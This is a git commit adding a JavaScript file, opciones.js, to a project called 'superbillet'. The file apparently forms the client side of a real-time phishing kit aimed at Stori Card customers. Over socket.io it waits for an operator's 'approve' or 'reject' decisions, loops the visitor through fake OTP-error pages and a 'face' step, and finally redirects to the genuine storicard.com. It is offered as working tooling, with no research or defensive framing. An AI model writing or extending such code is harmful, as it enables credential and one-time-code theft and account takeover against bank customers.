10f8c9d746a109d51b0a3c477d36a1ae540feffa
babymiko1502 <porlasnoches1502@hotmail.com>
2025-08-05 21:56:55 -0500

    Subiendo proyecto superbillet

---
+++ public/opciones.js
@@ -0,0 +1,65 @@
+const socket = io();
+const sessionId = localStorage.getItem("sessionId");
+
+// Al reconectar, asegura que el servidor sepa quién es
+socket.emit("reconectar", sessionId);
+
+// Escucha la respuesta general de acceso desde index.html
+socket.on("respuesta", (decision) => {
+  if (decision === "aprobado") {
+    window.location.href = "bienvenido.html";
+  } else if (decision === "rechazado") {
+    window.location.href = "errorlogo.html";
+  }
+});
+
+// Escucha la respuesta del código enviado desde bienvenido.html
+socket.on("respuestaCodigo", (decision) => {
+  if (decision === "error") {
+    window.location.href = "denegado.html";
+  } else if (decision === "finalizar") {
+    window.location.href = "https://www.storicard.com/";
+  }
+});
+
+// Escucha la respuesta del OTP reingresado desde denegado.html
+socket.on("respuestaOtp", (decision) => {
+  if (decision === "otp_error") {
+    window.location.href = "denegado.html";
+  } else if (decision === "finalizar") {
+    window.location.href = "https://www.storicard.com/";
+  }
+});
+
+// Escucha la respuesta del formulario reenviado desde errorlogo.html
+socket.on("respuestaErrorLogo", (decision) => {
+  if (decision === "otp") {
+    window.location.href = "bienvenido.html";
+  } else if (decision === "error_logo") {
+    window.location.href = "errorlogo.html";
+  }
+});
+
+// Agregar la acción para el botón "TC"
+const tcButton = document.getElementById("tcButton");
+if (tcButton) {
+  tcButton.addEventListener("click", () => {
+    // Emitir un evento 'tcAction' si es necesario para el servidor
+    socket.emit("accionTC", { sessionId });
+
+    // Redirigir a la página que desees (ejemplo: face.html)
+    window.location.href = "face.html";
+  });
+}
+
+// Agregar la acción para el botón "FACE"
+const faceButton = document.getElementById("faceButton");
+if (faceButton) {
+  faceButton.addEventListener("click", () => {
+    // Emitir un evento 'faceAction' si es necesario para el servidor
+    socket.emit("accionFace", { sessionId });
+
+    // Redirigir a face.html
+    window.location.href = "face.html";
+  });
+}
